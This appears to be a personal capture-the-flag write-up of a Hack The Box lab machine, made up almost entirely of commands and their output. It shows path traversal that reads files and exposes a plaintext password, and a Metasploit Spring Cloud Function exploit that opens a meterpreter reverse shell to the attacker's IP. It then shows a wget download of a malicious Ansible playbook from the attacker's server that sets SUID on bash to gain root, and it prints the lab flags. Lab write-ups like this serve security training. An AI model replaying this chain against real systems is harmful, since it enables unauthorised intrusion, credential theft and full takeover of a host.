target: 10.10.11.204
own: 10.10.14.188

Utilizando burpsuite en la parte de upload
```
GET /show_image?img=/../../../../../../ HTTP/1.1

bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```
GET /show_image?img=/../../../../../../home HTTP/1.1
frank
phil
```

```
GET /show_image?img=/../../../../../../home/frank/.m2/settings.xml HTTP/1.1
phil
DocPhillovestoInject123
```

```
GET /show_image?img=/../../../../../../var/www/WebApp/pom.xml HTTP/1.1
springframework
```


+ [exploit](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/spring_framework_rce_spring4shell)
*exploit/multi/http/spring_cloud_function_spel_injection

``` bash 
[msf](Jobs:0 Agents:0) >> use exploit/multi/http/spring_cloud_function_spel_injection
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> options

Module options (exploit/multi/http/spring_cloud_function_spel_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port
                                         ][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/do
                                         cs/using-metasploit/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly
                                         generated)
   TARGETURI  /functionRouter  yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This m
                                       ust be an address on the local machine or 0.0.0.0 to lis
                                       ten on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.101.16   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> set rhosts 10.10.11.204
rhosts => 10.10.11.204
[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> set lhosts 10.10.14.188
[-] Unknown datastore option: lhosts. Did you mean LHOST?
[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> set lhost 10.10.14.188
lhost => 10.10.14.188
[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> set SRVHOST 8080
SRVHOST => 8080
[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> run

[*] Started reverse TCP handler on 10.10.14.188:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Sending stage (3045348 bytes) to 10.10.11.204
[*] Meterpreter session 1 opened (10.10.14.188:4444 -> 10.10.11.204:49796) at 2023-06-14 07:00:37 -0600

(Meterpreter 1)(/) > ls
Listing: /
==========

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040755/rwxr-xr-x  36864  dir   2023-03-06 05:20:00 -0600  bin
040755/rwxr-xr-x  4096   dir   2023-03-06 05:43:39 -0600  boot
040755/rwxr-xr-x  4020   dir   2023-06-14 07:36:50 -0600  dev
040755/rwxr-xr-x  4096   dir   2023-03-06 05:21:17 -0600  etc
040755/rwxr-xr-x  4096   dir   2023-02-01 12:38:34 -0600  home
040755/rwxr-xr-x  4096   dir   2023-02-01 12:38:32 -0600  lib
040755/rwxr-xr-x  4096   dir   2022-02-23 02:49:52 -0600  lib32
040755/rwxr-xr-x  4096   dir   2022-05-25 02:11:39 -0500  lib64
040755/rwxr-xr-x  4096   dir   2022-02-23 02:49:52 -0600  libx32
040700/rwx------  16384  dir   2022-04-08 08:55:43 -0500  lost+found
040755/rwxr-xr-x  4096   dir   2022-02-23 02:50:00 -0600  media
040755/rwxr-xr-x  4096   dir   2023-02-01 12:38:34 -0600  mnt
040755/rwxr-xr-x  4096   dir   2022-10-19 23:23:23 -0500  opt
040555/r-xr-xr-x  0      dir   2023-06-14 07:36:40 -0600  proc
040700/rwx------  4096   dir   2023-03-06 07:15:44 -0600  root
040755/rwxr-xr-x  780    dir   2023-06-14 11:38:31 -0600  run
040755/rwxr-xr-x  20480  dir   2023-03-06 05:18:39 -0600  sbin
040755/rwxr-xr-x  4096   dir   2022-02-23 02:50:00 -0600  srv
040555/r-xr-xr-x  0      dir   2023-06-14 07:36:42 -0600  sys
041777/rwxrwxrwx  12288  dir   2023-06-14 13:00:20 -0600  tmp
040755/rwxr-xr-x  4096   dir   2022-02-23 02:53:41 -0600  usr
040755/rwxr-xr-x  4096   dir   2023-02-01 12:19:29 -0600  var

(Meterpreter 1)(/) > getuid
Server username: frank
(Meterpreter 1)(/) > shell
Process 22642 created.
Channel 1 created.
cd /home
ls
frank
phil
cd frank
ls
ls -la
total 28
drwxr-xr-x 5 frank frank 4096 Feb  1 18:38 .
drwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..
lrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1 18:38 .cache
drwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local
drwx------ 2 frank frank 4096 Feb  1 18:38 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
 cd ..
cd phil
ls
user.txt
cat user.txt
cat: user.txt: Permission denied
cd ..
ls
frank
phil
su phil
Password: DocPhillovestoInject123
cd phil
ls
user.txt
cat user.txt
aeb545e6484701c918624b9e075b8076
cd ..
cd ..
ls 
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd /opt
ls
automation
ls
automation
cd automation
ls
tasks
cd tasks
ls
playbook_1.yml
cat playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
wget http://10.10.14.188 
--2023-06-14 19:12:14--  http://10.10.14.188/
Connecting to 10.10.14.188:80... failed: Connection refused.
wget http://10.10.14.188:8000/   
--2023-06-14 19:12:42--  http://10.10.14.188:8000/
Connecting to 10.10.14.188:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 585 [text/html]
Saving to: ‘index.html’

     0K                                                       100%  588K=0.001s

2023-06-14 19:12:43 (588 KB/s) - ‘index.html’ saved [585/585]

ls
index.html
playbook_1.yml
```

``` bash
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs]
└──╼ $touch playbook_2.yml
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs]
└──╼ $nano playbook_2.yml 
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs]
└──╼ $cat playbook_2.yml 
- hosts: localhost
  tasks:
  - name: raz pe
    ansible.builtin.shell:
      chmod +s /bin/bash
    become: true
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs]
└──╼ $sudo python -m http.server
[sudo] password for ramdark: 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.204 - - [14/Jun/2023 07:12:54] "GET / HTTP/1.1" 200 -
10.10.11.204 - - [14/Jun/2023 07:14:55] "GET /playbook_2.yml HTTP/1.1" 200 -
```

``` bash
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs]
└──╼ $cp playbook_2.yml ~/
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs]
└──╼ $
```


``` bash
wget http://10.10.14.188:8000/playbook_2.yml
--2023-06-14 19:14:44--  http://10.10.14.188:8000/playbook_2.yml
Connecting to 10.10.14.188:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 114 [application/octet-stream]
Saving to: ‘playbook_2.yml’

     0K                                                       100% 14.9M=0s

2023-06-14 19:14:44 (14.9 MB/s) - ‘playbook_2.yml’ saved [114/114]

ls
playbook_1.yml
playbook_2.yml
ls /bin/bash -al
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
bash -p
whoami
root
cd /root
ls
playbook_1.yml
root.txt
cat root.txt
687834a9db29d83e5e84804972f194b8

```
